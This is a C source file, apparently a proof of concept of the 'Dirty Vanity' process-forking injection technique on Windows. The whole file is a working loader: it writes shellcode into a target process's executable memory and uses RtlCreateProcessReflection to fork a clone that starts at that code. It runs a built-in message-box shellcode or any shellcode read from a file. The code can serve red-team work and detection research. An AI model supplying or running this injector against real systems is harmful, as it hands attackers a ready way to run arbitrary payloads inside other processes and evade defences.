#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <ntstatus.h>
#include "original_shellcode.h"

#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004
#endif

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} T_CLIENT_ID;

typedef struct {
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    T_CLIENT_ID ReflectionClientId;
} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI* RtlCreateProcessReflectionFunc)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation
);

unsigned char* ReadShellcodeFromFile(const char* filename, SIZE_T* shellcodeSize) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        printf("[-] Failed to open shellcode file: %s\n", filename);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *shellcodeSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* shellcode = (unsigned char*)malloc(*shellcodeSize);
    if (shellcode == NULL) {
        printf("[-] Failed to allocate memory for shellcode\n");
        fclose(file);
        return NULL;
    }

    size_t bytesRead = fread(shellcode, 1, *shellcodeSize, file);
    if (bytesRead != *shellcodeSize) {
        printf("[-] Failed to read shellcode file\n");
        free(shellcode);
        fclose(file);
        return NULL;
    }

    fclose(file);
    printf("[+] Loaded shellcode: %zu bytes\n", *shellcodeSize);
    return shellcode;
}

BOOL ProcessForkingInjection(DWORD targetPid, unsigned char* shellcode, SIZE_T shellcodeSize) {
    printf("\n[+] Process Forking Injection (Dirty Vanity)\n");
    printf("[+] Target PID: %lu\n", targetPid);
    printf("[+] Shellcode size: %zu bytes\n", shellcodeSize);

    // Open target process with inheritable handle (required for RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES)
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
        TRUE,  // bInheritHandle must be TRUE when using RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
        targetPid
    );
    if (hProcess == NULL) {
        printf("[-] Failed to open target process: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Opened target process\n");

    // Allocate memory in target process
    LPVOID baseAddress = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (baseAddress == NULL) {
        printf("[-] Failed to allocate memory in target process: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Allocated remote memory at %p\n", baseAddress);

    // Write shellcode to target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, baseAddress, shellcode, shellcodeSize, &bytesWritten)) {
        printf("[-] Failed to write shellcode to target process: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Wrote shellcode to remote process\n");

    // Load ntdll.dll and resolve RtlCreateProcessReflection
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Failed to load ntdll.dll: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    RtlCreateProcessReflectionFunc RtlCreateProcessReflection =
        (RtlCreateProcessReflectionFunc)GetProcAddress(hNtdll, "RtlCreateProcessReflection");
    if (RtlCreateProcessReflection == NULL) {
        printf("[-] Failed to resolve RtlCreateProcessReflection: %lu\n", GetLastError());
        FreeLibrary(hNtdll);
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Resolved RtlCreateProcessReflection at %p\n", (void*)RtlCreateProcessReflection);

    // Fork the process
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION reflectionInfo = { 0 };
    NTSTATUS status = RtlCreateProcessReflection(
        hProcess,
        RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
        baseAddress,  // StartRoutine = shellcode address
        NULL,         // StartContext
        NULL,         // EventHandle
        &reflectionInfo
    );

    if (status == STATUS_SUCCESS) {
        DWORD forkedPid = (DWORD)(DWORD_PTR)reflectionInfo.ReflectionClientId.UniqueProcess;
        printf("[+] Successfully forked process!\n");
        printf("[+] Forked process PID: %lu\n", forkedPid);
        printf("[+] Forked process handle: %p\n", reflectionInfo.ReflectionProcessHandle);
        printf("[+] Forked thread handle: %p\n", reflectionInfo.ReflectionThreadHandle);

        // Close reflection handles
        if (reflectionInfo.ReflectionProcessHandle) {
            CloseHandle(reflectionInfo.ReflectionProcessHandle);
        }
        if (reflectionInfo.ReflectionThreadHandle) {
            CloseHandle(reflectionInfo.ReflectionThreadHandle);
        }

        FreeLibrary(hNtdll);
        CloseHandle(hProcess);
        return TRUE;
    }
    else {
        printf("[-] RtlCreateProcessReflection failed with NTSTATUS: 0x%08lX\n", status);
        FreeLibrary(hNtdll);
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    printf("[+] Process Forking Injection POC (Dirty Vanity)\n");
    printf("[+] Windows Fork API Abuse - RtlCreateProcessReflection\n\n");

    if (argc < 2 || argc > 3) {
        printf("Usage: %s <target_pid> [shellcode.bin]\n", argv[0]);
        printf("\n");
        printf("Example:\n");
        printf("  %s 1234                    - Use built-in position-independent shellcode\n", argv[0]);
        printf("  %s 1234 calc_shellcode.bin - Use shellcode from file\n", argv[0]);
        printf("\n");
        printf("Notes:\n");
        printf("  - Requires PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, PROCESS_DUP_HANDLE permissions\n");
        printf("  - Target process will be forked with shellcode as entry point\n");
        printf("  - Forked process inherits target's memory and handles\n");
        printf("  - IMPORTANT: Shellcode MUST be position-independent (PEB walking style)\n");
        return 1;
    }

    DWORD targetPid = atoi(argv[1]);
    if (targetPid == 0) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    unsigned char* shellcode;
    SIZE_T shellcodeSize;
    BOOL shouldFree = FALSE;

    if (argc == 2) {
        // Use built-in position-independent shellcode
        printf("[+] Using built-in position-independent shellcode\n");
        printf("[+] Shellcode: cmd /k msg * Hello from Dirty Vanity\n");
        shellcode = DIRTY_VANITY_SHELLCODE;
        shellcodeSize = sizeof(DIRTY_VANITY_SHELLCODE);
        printf("[+] Shellcode size: %zu bytes\n\n", shellcodeSize);
    } else {
        // Read from file
        shellcode = ReadShellcodeFromFile(argv[2], &shellcodeSize);
        if (shellcode == NULL) {
            return 1;
        }
        shouldFree = TRUE;
        printf("\n");
    }

    BOOL success = ProcessForkingInjection(targetPid, shellcode, shellcodeSize);

    if (shouldFree) {
        free(shellcode);
    }

    if (success) {
        printf("\n[+] Process forking injection successful!\n");
        return 0;
    }
    else {
        printf("\n[-] Process forking injection failed!\n");
        return 1;
    }
}
